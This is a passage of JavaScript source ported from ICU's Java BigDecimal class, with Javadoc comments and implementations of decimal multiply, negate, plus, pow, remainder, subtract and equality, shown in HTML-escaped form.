(&lt;b&gt;&lt;code&gt;*&lt;/code&gt;&lt;/b&gt;) operator * (as defined in the decimal documentation, see &#123;@link BigDecimal * class header&#125;), * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the multiplication. * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this*rhs&lt;/code&gt;. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal multiply(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123; function multiply() &#123; var set; if (multiply.arguments.length == 2) &#123; set = multiply.arguments[1]; &#125; else if (multiply.arguments.length == 1) &#123; set = this.plainMC; &#125; else &#123; throw \"multiply(): \" + multiply.arguments.length + \" arguments given; expected 1 or 2\"; &#125; var rhs = multiply.arguments[0]; //--com.ibm.icu.math.BigDecimal lhs; var lhs; //--int padding; var padding; //--int reqdig; var reqdig; //--byte multer[]=null; var multer=null; //--byte multand[]=null; var multand=null; //--int multandlen; var multandlen; //--int acclen=0; var acclen=0; //--com.ibm.icu.math.BigDecimal res; var res; //--byte acc[]; var acc; //--int n=0; var n=0; //--byte mult=0; var mult=0; if (set.lostDigits) this.checkdigits(rhs,set.digits); lhs=this; // name for clarity and proxy /* Prepare numbers (truncate, unless unlimited precision) */ padding=0; // trailing 0's to add reqdig=set.digits; // local copy if (reqdig&gt;0) &#123; if (lhs.mant.length&gt;reqdig) lhs=this.clone(lhs).round(set); if (rhs.mant.length&gt;reqdig) rhs=this.clone(rhs).round(set); // [we could reuse the new LHS for result in this case] &#125; else &#123;/* unlimited */ // fixed point arithmetic will want every trailing 0; we add these // after the calculation rather than before, for speed. if (lhs.exp&gt;0) padding=padding+lhs.exp; if (rhs.exp&gt;0) padding=padding+rhs.exp; &#125; // For best speed, as in DMSRCN, we use the shorter number as the // multiplier and the longer as the multiplicand. // 1999.12.22: We used to special case when the result would fit in // a long, but with Java 1.3 this gave no advantage. if (lhs.mant.length&lt;rhs.mant.length) &#123; multer=lhs.mant; multand=rhs.mant; &#125; else &#123; multer=rhs.mant; multand=lhs.mant; &#125; /* Calculate how long result byte array will be */ multandlen=(multer.length+multand.length)-1; // effective length // optimize for 75% of the cases where a carry is expected... if ((multer[0]*multand[0])&gt;9) acclen=multandlen+1; else acclen=multandlen; /* Now the main long multiplication loop */ res=new BigDecimal(); // where we'll build result acc=this.createArrayWithZeros(acclen); // accumulator, all zeros // 1998.07.01: calculate from left to right so that accumulator goes // to likely final length on first addition; this avoids a one-digit // extension (and object allocation) each time around the loop. // Initial number therefore has virtual zeros added to right. &#123;var $7=multer.length;n=0;n:for(;$7&gt;0;$7--,n++)&#123; mult=multer[n]; if (mult!=0) &#123; // [optimization] // accumulate [accumulator is reusable array] acc=this.byteaddsub(acc,acc.length,multand,multandlen,mult,true); &#125; // divide multiplicand by 10 for next digit to right multandlen--; // 'virtual length' &#125; &#125;/*n*/ res.ind=lhs.ind*rhs.ind; // final sign res.exp=(lhs.exp+rhs.exp)-padding; // final exponent // [overflow is checked by finish] /* add trailing zeros to the result, if necessary */ if (padding==0) res.mant=acc; else res.mant=this.extend(acc,acc.length+padding); // add trailing 0s return res.finish(set,false); &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;-this&lt;/code&gt;. * &lt;p&gt; * The same as &#123;@link #negate(MathContext)&#125;, where the context is * &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;. * &lt;p&gt; * The length of the decimal part (the scale) of the result will be * be &lt;code&gt;this.scale()&lt;/code&gt; * * * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;-this&lt;/code&gt;. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal negate()&#123; //-- return this.negate(plainMC); //-- &#125; /** * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is &lt;code&gt;-this&lt;/code&gt;. * &lt;p&gt; * Implements the negation (Prefix &lt;b&gt;&lt;code&gt;-&lt;/code&gt;&lt;/b&gt;) operator * (as defined in the decimal documentation, see &#123;@link BigDecimal * class header&#125;), * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object. * * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;-this&lt;/code&gt;. * @stable ICU 2.0 */ //public com.ibm.icu.math.BigDecimal negate(com.ibm.icu.math.MathContext set)&#123; function negate() &#123; var set; if (negate.arguments.length == 1) &#123; set = negate.arguments[0]; &#125; else if (negate.arguments.length == 0) &#123; set = this.plainMC; &#125; else &#123; throw \"negate(): \" + negate.arguments.length + \" arguments given; expected 0 or 1\"; &#125; //--com.ibm.icu.math.BigDecimal res; var res; // Originally called minus(), changed to matched Java precedents // This simply clones, flips the sign, and possibly rounds if (set.lostDigits) this.checkdigits(null,set.digits); res=this.clone(this); // safe copy res.ind=-res.ind; return res.finish(set,false); &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;+this&lt;/code&gt;. * Note that &lt;code&gt;this&lt;/code&gt; is not necessarily a * plain &lt;code&gt;BigDecimal&lt;/code&gt;, but the result will always be. * &lt;p&gt; * The same as &#123;@link #plus(MathContext)&#125;, where the context is * &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;. * &lt;p&gt; * The length of the decimal part (the scale) of the result will be * be &lt;code&gt;this.scale()&lt;/code&gt; * * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;+this&lt;/code&gt;. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal plus()&#123; //-- return this.plus(plainMC); //-- &#125; /** * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;+this&lt;/code&gt;. * &lt;p&gt; * Implements the plus (Prefix &lt;b&gt;&lt;code&gt;+&lt;/code&gt;&lt;/b&gt;) operator * (as defined in the decimal documentation, see &#123;@link BigDecimal * class header&#125;), * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object. * &lt;p&gt; * This method is useful for rounding or otherwise applying a context * to a decimal value. * * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;+this&lt;/code&gt;. * @stable ICU 2.0 */ //public com.ibm.icu.math.BigDecimal plus(com.ibm.icu.math.MathContext set)&#123; function plus() &#123; var set; if (plus.arguments.length == 1) &#123; set = plus.arguments[0]; &#125; else if (plus.arguments.length == 0) &#123; set = this.plainMC; &#125; else &#123; throw \"plus(): \" + plus.arguments.length + \" arguments given; expected 0 or 1\"; &#125; // This clones and forces the result to the new settings // May return same object if (set.lostDigits) this.checkdigits(null,set.digits); // Optimization: returns same object for some common cases if (set.form==MathContext.prototype.PLAIN) if (this.form==MathContext.prototype.PLAIN) &#123; if (this.mant.length&lt;=set.digits) return this; if (set.digits==0) return this; &#125; return this.clone(this).finish(set,false); &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this**rhs&lt;/code&gt;, using fixed point arithmetic. * &lt;p&gt; * The same as &#123;@link #pow(BigDecimal, MathContext)&#125;, * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;, * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;. * &lt;p&gt; * The parameter is the power to which the &lt;code&gt;this&lt;/code&gt; will be * raised; it must be in the range 0 through 999999999, and must * have a decimal part of zero. Note that these restrictions may be * removed in the future, so they should not be used as a test for a * whole number. * &lt;p&gt; * In addition, the power must not be negative, as no * &lt;code&gt;MathContext&lt;/code&gt; is used and so the result would then * always be 0. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the operation (the power). * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this**rhs&lt;/code&gt;, using fixed point arithmetic. * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is out of range or * is not a whole number. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal pow(com.ibm.icu.math.BigDecimal rhs)&#123; //-- return this.pow(rhs,plainMC); //-- &#125; // The name for this method is inherited from the precedent set by the // BigInteger and Math classes. /** * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is &lt;code&gt;this**rhs&lt;/code&gt;. * &lt;p&gt; * Implements the power (&lt;b&gt;&lt;code&gt;**&lt;/code&gt;&lt;/b&gt;) operator * (as defined in the decimal documentation, see &#123;@link BigDecimal * class header&#125;), * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object. * &lt;p&gt; * The first parameter is the power to which the &lt;code&gt;this&lt;/code&gt; * will be raised; it must be in the range -999999999 through * 999999999, and must have a decimal part of zero. Note that these * restrictions may be removed in the future, so they should not be * used as a test for a whole number. * &lt;p&gt; * If the &lt;code&gt;digits&lt;/code&gt; setting of the &lt;code&gt;MathContext&lt;/code&gt; * parameter is 0, the power must be zero or positive. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the operation (the power). * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this**rhs&lt;/code&gt;. * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is out of range or * is not a whole number. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal pow(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123; function pow() &#123; var set; if (pow.arguments.length == 2) &#123; set = pow.arguments[1]; &#125; else if (pow.arguments.length == 1) &#123; set = this.plainMC; &#125; else &#123; throw \"pow(): \" + pow.arguments.length + \" arguments given; expected 1 or 2\"; &#125; var rhs = pow.arguments[0]; //--int n; var n; //--com.ibm.icu.math.BigDecimal lhs; var lhs; //--int reqdig; var reqdig; //-- int workdigits=0; var workdigits=0; //--int L=0; var L=0; //--com.ibm.icu.math.MathContext workset; var workset; //--com.ibm.icu.math.BigDecimal res; var res; //--boolean seenbit; var seenbit; //--int i=0; var i=0; if (set.lostDigits) this.checkdigits(rhs,set.digits); n=rhs.intcheck(this.MinArg,this.MaxArg); // check RHS by the rules lhs=this; // clarified name reqdig=set.digits; // local copy (heavily used) if (reqdig==0) &#123; if (rhs.ind==this.isneg) //--throw new java.lang.ArithmeticException(\"Negative power:\"+\" \"+rhs.toString()); throw \"pow(): Negative power: \" + rhs.toString(); workdigits=0; &#125; else &#123;/* non-0 digits */ if ((rhs.mant.length+rhs.exp)&gt;reqdig) //--throw new java.lang.ArithmeticException(\"Too many digits:\"+\" \"+rhs.toString()); throw \"pow(): Too many digits: \" + rhs.toString(); /* Round the lhs to DIGITS if need be */ if (lhs.mant.length&gt;reqdig) lhs=this.clone(lhs).round(set); /* L for precision calculation [see ANSI X3.274-1996] */ L=rhs.mant.length+rhs.exp; // length without decimal zeros/exp workdigits=(reqdig+L)+1; // calculate the working DIGITS &#125; /* Create a copy of set for working settings */ // Note: no need to check for lostDigits again. // 1999.07.17 Note: this construction must follow RHS check workset=new MathContext(workdigits,set.form,false,set.roundingMode); res=this.ONE; // accumulator if (n==0) return res; // x**0 == 1 if (n&lt;0) n=-n; // [rhs.ind records the sign] seenbit=false; // set once we've seen a 1-bit &#123;i=1;i:for(;;i++)&#123; // for each bit [top bit ignored] //n=n+n; // shift left 1 bit n&lt;&lt;=1; if (n&lt;0) &#123; // top bit is set seenbit=true; // OK, we're off res=res.multiply(lhs,workset); // acc=acc*x &#125; if (i==31) break i; // that was the last bit if ((!seenbit)) continue i; // we don't have to square 1 res=res.multiply(res,workset); // acc=acc*acc [square] &#125; &#125;/*i*/ // 32 bits if (rhs.ind&lt;0) // was a **-n [hence digits&gt;0] res=this.ONE.divide(res,workset); // .. so acc=1/acc return res.finish(set,true); // round and strip [original digits] &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * the remainder of &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic. * &lt;p&gt; * The same as &#123;@link #remainder(BigDecimal, MathContext)&#125;, * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;, * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;. * &lt;p&gt; * This is not the modulo operator -- the result may be negative. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the remainder operation. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the remainder * of &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic. * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal remainder(com.ibm.icu.math.BigDecimal rhs)&#123; //-- return this.dodivide('R',rhs,plainMC,-1); //-- &#125; /** * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the remainder of * &lt;code&gt;this/rhs&lt;/code&gt;. * &lt;p&gt; * Implements the remainder operator * (as defined in the decimal documentation, see &#123;@link BigDecimal * class header&#125;), * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object. * &lt;p&gt; * This is not the modulo operator -- the result may be negative. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the remainder operation. * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the remainder * of &lt;code&gt;this+rhs&lt;/code&gt;. * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero. * @throws ArithmeticException if the integer part of the result will * not fit in the number of digits specified for the * context. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal remainder(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123; function remainder() &#123; var set; if (remainder.arguments.length == 2) &#123; set = remainder.arguments[1]; &#125; else if (remainder.arguments.length == 1) &#123; set = this.plainMC; &#125; else &#123; throw \"remainder(): \" + remainder.arguments.length + \" arguments given; expected 1 or 2\"; &#125; var rhs = remainder.arguments[0]; return this.dodivide('R',rhs,set,-1); &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this-rhs&lt;/code&gt;, using fixed point arithmetic. * &lt;p&gt; * The same as &#123;@link #subtract(BigDecimal, MathContext)&#125;, * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;, * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;. * &lt;p&gt; * The length of the decimal part (the scale) of the result will be * the maximum of the scales of the two operands. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the subtraction. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this-rhs&lt;/code&gt;, using fixed point arithmetic. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal subtract(com.ibm.icu.math.BigDecimal rhs)&#123; //-- return this.subtract(rhs,plainMC); //-- &#125; /** * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is &lt;code&gt;this-rhs&lt;/code&gt;. * &lt;p&gt; * Implements the subtraction (&lt;b&gt;&lt;code&gt;-&lt;/code&gt;&lt;/b&gt;) operator * (as defined in the decimal documentation, see &#123;@link BigDecimal * class header&#125;), * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the subtraction. * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this-rhs&lt;/code&gt;. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal subtract(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123; function subtract() &#123; var set; if (subtract.arguments.length == 2) &#123; set = subtract.arguments[1]; &#125; else if (subtract.arguments.length == 1) &#123; set = this.plainMC; &#125; else &#123; throw \"subtract(): \" + subtract.arguments.length + \" arguments given; expected 1 or 2\"; &#125; var rhs = subtract.arguments[0]; //--com.ibm.icu.math.BigDecimal newrhs; var newrhs; if (set.lostDigits) this.checkdigits(rhs,set.digits); // [add will recheck .. but would report -rhs] /* carry out the subtraction */ // we could fastpath -0, but it is too rare. newrhs=this.clone(rhs); // safe copy newrhs.ind=-newrhs.ind; // prepare to subtract return this.add(newrhs,set); // arithmetic &#125; /* ---------------------------------------------------------------- */ /* Other methods */ /* ---------------------------------------------------------------- */ /** * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a &lt;code&gt;byte&lt;/code&gt;. * If the &lt;code&gt;BigDecimal&lt;/code&gt; has a non-zero decimal part or is * out of the possible range for a &lt;code&gt;byte&lt;/code&gt; (8-bit signed * integer) result then an &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown. * * @return A &lt;code&gt;byte&lt;/code&gt; equal in value to &lt;code&gt;this&lt;/code&gt;. * @throws ArithmeticException if &lt;code&gt;this&lt;/code&gt; has a non-zero * decimal part, or will not fit in a &lt;code&gt;byte&lt;/code&gt;. * @stable ICU 2.0 */ //--public byte byteValueExact()&#123; //-- int num; //-- num=this.intValueExact(); // will check decimal part too //-- if ((num&gt;127)|(num&lt;(-128))) //-- throw new java.lang.ArithmeticException(\"Conversion overflow:\"+\" \"+this.toString()); //-- return (byte)num; //-- &#125; /** * Compares this &lt;code&gt;BigDecimal&lt;/code&gt; with the value of the parameter. * &lt;p&gt; * If the parameter is &lt;code&gt;null&lt;/code&gt;, or is not an instance of the * &lt;code&gt;BigDecimal&lt;/code&gt; type, an exception is thrown. * Otherwise, the parameter is cast to type &lt;code&gt;BigDecimal&lt;/code&gt; * and the result of the &#123;@link #compareTo(BigDecimal)&#125; method, * using the cast parameter, is returned. * &lt;p&gt; * The &#123;@link #compareTo(BigDecimal, MathContext)&#125; method should be * used when a &lt;code&gt;MathContext&lt;/code&gt; is needed for the comparison. * * @param rhs The &lt;code&gt;Object&lt;/code&gt; for the right hand side of * the comparison. * @return An &lt;code&gt;int&lt;/code&gt; whose value is -1, 0, or 1 as * &lt;code&gt;this&lt;/code&gt; is numerically less than, equal to, * or greater than &lt;code&gt;rhs&lt;/code&gt;. * @throws ClassCastException if &lt;code&gt;rhs&lt;/code&gt; cannot be cast to * a &lt;code&gt;BigDecimal&lt;/code&gt; object. * @see #compareTo(BigDecimal) * @stable ICU 2.0 */ //--public int compareTo(java.lang.Object rhsobj)&#123; //-- // the cast in the next line will raise ClassCastException if necessary //-- return compareTo((com.ibm.icu.math.BigDecimal)rhsobj,plainMC); //-- &#125; /** * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a &lt;code&gt;double&lt;/code&gt;. * If the &lt;code&gt;BigDecimal&lt;/code&gt; is out of the possible range for a * &lt;code&gt;double&lt;/code&gt; (64-bit signed floating point) result then an * &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown. * &lt;p&gt; * The double produced is identical to result of expressing the * &lt;code&gt;BigDecimal&lt;/code&gt; as a &lt;code&gt;String&lt;/code&gt; and then * converting it using the &lt;code&gt;Double(String)&lt;/code&gt; constructor; * this can result in values of &lt;code&gt;Double.NEGATIVE_INFINITY&lt;/code&gt; * or &lt;code&gt;Double.POSITIVE_INFINITY&lt;/code&gt;. * * @return A &lt;code&gt;double&lt;/code&gt; corresponding to &lt;code&gt;this&lt;/code&gt;. * @stable ICU 2.0 */ //--public double doubleValue()&#123; //-- // We go via a String [as does BigDecimal in JDK 1.2] //-- // Next line could possibly raise NumberFormatException //-- return java.lang.Double.valueOf(this.toString()).doubleValue(); //-- &#125; /** * Compares this &lt;code&gt;BigDecimal&lt;/code&gt; with &lt;code&gt;rhs&lt;/code&gt; for * equality. * &lt;p&gt; * If the parameter is &lt;code&gt;null&lt;/code&gt;, or is not an instance of the * BigDecimal type, or is not exactly equal to the current * &lt;code&gt;BigDecimal&lt;/code&gt; object, then &lt;i&gt;false&lt;/i&gt; is returned. * Otherwise, &lt;i&gt;true&lt;/i&gt; is returned. * &lt;p&gt; * \"Exactly equal\", here, means that the &lt;code&gt;String&lt;/code&gt; * representations of the &lt;code&gt;BigDecimal&lt;/code&gt; numbers are * identical (they have the same characters in the same sequence). * &lt;p&gt; * The &#123;@link #compareTo(BigDecimal, MathContext)&#125; method should be * used for more general comparisons. * @param rhs The &lt;code&gt;Object&lt;/code&gt; for the right hand side of * the comparison. * @return A &lt;code&gt;boolean&lt;/code&gt; whose value &lt;i&gt;true&lt;/i&gt; if and * only if the operands have identical string representations. * @throws ClassCastException if &lt;code&gt;rhs&lt;/code&gt; cannot be cast to * a &lt;code&gt;BigDecimal&lt;/code&gt; object. * @stable ICU 2.0 * @see #compareTo(Object) * @see #compareTo(BigDecimal) * @see #compareTo(BigDecimal, MathContext) */ //--public boolean equals(java.lang.Object obj)&#123; function equals(obj) &#123; //--com.ibm.icu.math.BigDecimal rhs; var rhs; //--int i=0; var i=0; //--char lca[]=null; var lca=null; //--char rca[]=null; var rca=null; // We are equal iff toString of both are exactly the same if (obj==null) return false; // not equal if ((!(((obj instanceof BigDecimal))))) return false; // not a decimal rhs=obj; // cast; we know it will work if (this.ind!=rhs.ind) return false; // different signs never match if (((this.mant.length==rhs.mant.length)&amp;&amp;(this.exp==rhs.exp))&amp;&amp;(this.form==rhs.form)) &#123; // mantissas say all // here with equal-length byte arrays to compare &#123;var $8=this.mant.length;i=0;i:for(;$8&gt;0;$8--,i++)&#123; if (this.mant[i]!=rhs.mant[i]) return false; &#125; &#125;/*i*/ &#125; else &#123; // need proper layout lca=this.layout(); // layout to character array rca=rhs.layout(); if (lca.length!=rca.length) return false; // mismatch // here with equal-length character arrays to compare &#123;var $9=lca.length;i=0;i:for(;$9&gt;0;$9--,i++)&#123; if (lca[i]!=rca[i]) return false; &#125; &#125;/*i*/ &#125; return true; // arrays have identical content &#125; /** * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a &lt;code&gt;float&lt;/code&gt;. * If the &lt;code&gt;BigDecimal&lt;/code&gt; is out of the possible range for a * &lt;code&gt;float&lt;/code&gt; (32-bit signed floating point) result then an * &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown. * &lt;p&gt; * The float produced is identical to result of expressing the * &lt;code&gt;BigDecimal&lt;/code&gt; as a &lt;code&gt;String&lt;/code&gt; and then * converting it using the &lt;code&gt;Float(String)&lt;/code&gt; constructor; * this can result in values of &lt;code&gt;Float.NEGATIVE_INFINITY&lt;/code&gt; * or &lt;code&gt;Float.POSITIVE_INFINITY&lt;/code&gt;. * * @return A &lt;code&gt;float&lt;/code&gt; corresponding to &lt;code&gt;this&lt;/code&gt;. * @stable ICU 2.0 */ //--public float floatValue()&#123; //-- return java.lang.Float.valueOf(this.toString()).floatValue(); //-- &#125; /** * Returns the &lt;code&gt;String&lt;/code&gt; representation of this * &lt;code&gt;BigDecimal&lt;/code&gt;, modified by layout parameters. * &lt;p&gt; * &lt;i&gt;This method is provided as a primitive for use by more * sophisticated classes, such as &lt;code&gt;DecimalFormat&lt;/code&gt;, that * can apply locale-sensitive editing of the result. The level of * formatting that it provides is a necessary part of the BigDecimal * class as it is sensitive to and must follow the calculation and * rounding rules for BigDecimal arithmetic. * However, if the function is provided elsewhere, it may be removed * from this class. &lt;/i&gt; * &lt;p&gt; * The parameters, for both forms of the &lt;code&gt;format&lt;/code&gt; method * are all of type &lt;code&gt;int&lt;/code&gt;. * A value of -1 for any parameter indicates that the default action * or value for that parameter should be used. * &lt;p&gt; * The parameters, &lt;code&gt;before&lt;/code&gt; and &lt;code&gt;after&lt;/code&gt;, * specify the number of characters to be used for the integer part * and decimal part of the result respectively. Exponential notation * is not used. If either parameter is -1 (which indicates the default * action), the number of characters used will be exactly as many as * are needed for that part. * &lt;p&gt; * &lt;code&gt;before&lt;/code&gt; must be a positive number; if it is larger than * is needed to contain the integer part, that part is padded on the * left with blanks to the requested length. If &lt;code&gt;before&lt;/code&gt; is * not large enough to contain the integer part of the number * (including the sign, for negative numbers) an exception is thrown. * &lt;p&gt; * &lt;code&gt;after&lt;/code&gt; must be a non-negative number; if it is not the * same size as the decimal part of the number, the number will be * rounded (or extended with zeros) to fit. Specifying 0 for * &lt;code&gt;after&lt;/code&gt; will cause the number to be rounded to an * integer (that is, it will have no decimal part or decimal point). * The rounding method will be the default, * &lt;code&gt;MathContext.ROUND_HALF_UP&lt;/code&gt;. * &lt;p&gt; * Other rounding methods, and the use of exponential notation, can * be selected by using &#123;@link #format(int,int,int,int,int,int)&#125;. * Using the two-parameter form of the method has exactly the same * effect as using the six-parameter form with the final four * parameters all being -1. * * @param before The &lt;code&gt;int&lt;/code&gt; specifying the number of places * before the decimal point. Use -1 for 'as many as * are needed'. * @param after The &lt;code&gt;int&lt;/code&gt; specifying the number of places * after the decimal point. Use -1 for 'as many as are * needed'. * @return A &lt;code&gt;String&lt;/code&gt; representing this * &lt;code&gt;BigDecimal&lt;/code&gt;, laid out according to the * specified parameters * @throws ArithmeticException if the number cannot be laid out as * requested. * @throws IllegalArgumentException if a parameter is out of range. * @stable ICU 2.0 * @see #toString * @see #toCharArray */ //--public java.lang.String format(int before,int after)&#123; //-- return format(before,after,-1,-1,com.ibm.icu.math.MathContext.SCIENTIFIC,ROUND_HALF_UP); //-- &#125; /** * Returns the &lt;code&gt;String&lt;/code&gt; representation of this * &lt;code&gt;BigDecimal&lt;/code&gt;, modified by layout parameters and allowing * exponential notation. * &lt;p&gt; * &lt;i&gt;This method is provided as a primitive for use by more * sophisticated classes, such as &lt;code&gt;DecimalFormat&lt;/code&gt;, that * can apply locale-sensitive editing of the result. The level of * formatting that it provides is a necessary part of the BigDecimal * class as it is sensitive to and must follow the calculation and * rounding rules for BigDecimal arithmetic. * However, if the function is provided elsewhere, it may be removed * from this class. &lt;/i&gt; * &lt;p&gt; * The parameters are all of type &lt;code&gt;int&lt;/code&gt;. * A value of -1 for any parameter indicates that the default action * or value for that parameter should be used. * &lt;p&gt; * The first two parameters (&lt;code&gt;before&lt;/code&gt; and * &lt;code&gt;after&lt;/code&gt;) specify the number of characters to be used for * the integer part and decimal part of the result respectively, as * defined for &#123;@link #format(int,int)&#125;. * If either of these is -1 (which indicates the default action), the * number of characters used will be exactly as many as are needed for * that part. * &lt;p&gt; * The remaining parameters control the use of exponential notation * and rounding. Three (&lt;code&gt;explaces&lt;/code&gt;, &lt;code&gt;exdigits&lt;/code&gt;, * and &lt;code&gt;exform&lt;/code&gt;) control the exponent part of the result. * As before, the default action for any of these parameters may be * selected by using the value -1. * &lt;p&gt; * &lt;code&gt;explaces&lt;/code&gt; must be a positive number; it sets the number * of places (digits after the sign of the exponent) to be used for * any exponent part, the default (when &lt;code&gt;explaces&lt;/code&gt; is -1) * being to use as many as are needed. * If &lt;code&gt;explaces&lt;/code&gt; is not -1, space is always reserved for * an exponent; if one is not needed (for example, if the exponent * will be 0) then &lt;code&gt;explaces&lt;/code&gt;+2 blanks are appended to the * result. * &lt;!-- (This preserves vertical alignment of similarly formatted * numbers in a monospace font.) --&gt; * If &lt;code&gt;explaces&lt;/code&gt; is not -1 and is not large enough to * contain the exponent, an exception is thrown. * &lt;p&gt; * &lt;code&gt;exdigits&lt;/code&gt; sets the trigger point for use of exponential * notation. If, before any rounding, the number of places needed * before the decimal point exceeds &lt;code&gt;exdigits&lt;/code&gt;, or if the * absolute value of the result is less than &lt;code&gt;0.000001&lt;/code&gt;, * then exponential form will be used, provided that * &lt;code&gt;exdigits&lt;/code&gt; was specified. * When &lt;code&gt;exdigits&lt;/code&gt; is -1, exponential notation will never * be used. If 0 is specified for &lt;code&gt;exdigits&lt;/code&gt;, exponential * notation is always used unless the exponent would be 0. * &lt;p&gt; * &lt;code&gt;exform&lt;/code&gt; sets the form for exponential notation (if * needed). * It may be either &#123;@link MathContext#SCIENTIFIC&#125; or * &#123;@link MathContext#ENGINEERING&#125;. * If the latter, engineering, form is requested, up to three digits * (plus sign, if negative) may be needed for the integer part of the * result (&lt;code&gt;before&lt;/code&gt;). Otherwise, only one digit (plus * sign, if negative) is needed. * &lt;p&gt; * Finally, the sixth argument, &lt;code&gt;exround&lt;/code&gt;, selects the * rounding algorithm to be used, and must be one of the values * indicated by a public constant in the &#123;@link MathContext&#125; class * whose name starts with &lt;code&gt;ROUND_&lt;/code&gt;. * The default (&lt;code&gt;ROUND_HALF_UP&lt;/code&gt;) may also be selected by * using the value -1, as before. * &lt;p&gt; * The special value &lt;code&gt;MathContext.ROUND_UNNECESSARY&lt;/code&gt; may be * used to detect whether non-zero digits are discarded -- if * &lt;code&gt;exround&lt;/code&gt; has this value than if non-zero digits would * be discarded (rounded) during formatting then an * &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown. * * @param before The &lt;code&gt;int&lt;/code&gt; specifying the number of places * before the decimal point. * Use -1 for 'as many as are needed'. * @param after The &lt;code&gt;int&lt;/code&gt; specifying the number of places * after the decimal point. * Use -1 for 'as many as are needed'. * @param explaces The &lt;code&gt;int&lt;/code&gt; specifying the number of places * to be used for any exponent. * Use -1 for 'as many as are needed'. * @param exdigits The &lt;code&gt;int&lt;/code&gt; specifying the trigger * (digits before the decimal point) which if * exceeded causes exponential notation to be used. * Use 0 to force exponential notation. * Use -1 to force plain notation (no exponential * notation). * @param exform The 